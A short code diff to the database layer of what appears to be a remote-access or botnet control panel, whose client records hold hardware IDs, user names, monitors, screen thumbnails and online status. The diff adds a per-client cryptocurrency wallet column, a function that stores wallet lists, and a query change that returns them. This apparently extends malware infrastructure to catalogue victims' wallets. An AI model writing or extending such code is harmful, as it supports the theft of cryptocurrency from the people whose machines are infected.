@@ -67,6 +67,9 @@ try {
 try {
   db.run(`ALTER TABLE clients ADD COLUMN enrolled_by TEXT`);
 } catch {}
+try {
+  db.run(`ALTER TABLE clients ADD COLUMN crypto_wallets TEXT`);
+} catch {}
 db.run(
   `CREATE INDEX IF NOT EXISTS idx_clients_public_key ON clients(public_key);`,
 );
@@ -306,6 +309,14 @@ export function getClientIp(id: string): string | null {
   return row?.ip || null;
 }
 
+export function setCryptoWallets(id: string, wallets: string[]): void {
+  db.run(
+    `UPDATE clients SET crypto_wallets=? WHERE id=?`,
+    JSON.stringify(wallets),
+    id,
+  );
+}
+
 export function banIp(ip: string, reason?: string) {
   db.run(
     `INSERT OR REPLACE INTO banned_ips (ip, reason, created_at) VALUES (?, ?, ?)`
@@ -480,7 +491,7 @@ export function listClients(filters: ListFilters): ListResult {
 
   const rows = db
     .query<any>(
-      `SELECT id, hwid, role, host, os, arch, version, user, nickname, custom_tag as customTag, custom_tag_note as customTagNote, monitors, country, last_seen as lastSeen, online, ping_ms as pingMs, bookmarked, enrollment_status as enrollmentStatus, public_key as publicKey, key_fingerprint as keyFingerprint
+      `SELECT id, hwid, role, host, os, arch, version, user, nickname, custom_tag as customTag, custom_tag_note as customTagNote, monitors, country, last_seen as lastSeen, online, ping_ms as pingMs, bookmarked, enrollment_status as enrollmentStatus, public_key as publicKey, key_fingerprint as keyFingerprint, crypto_wallets as cryptoWalletsJson
        FROM clients
        ${whereSql}
        ${orderBy}
@@ -509,6 +520,9 @@ export function listClients(filters: ListFilters): ListResult {
     enrollmentStatus: c.enrollmentStatus || "pending",
     publicKey: c.publicKey || null,
     keyFingerprint: c.keyFingerprint || null,
+    cryptoWallets: (() => {
+      try { return c.cryptoWalletsJson ? JSON.parse(c.cryptoWalletsJson) : null; } catch { return null; }
+    })(),
     thumbnail: getThumbnail(c.id),
   }));
 
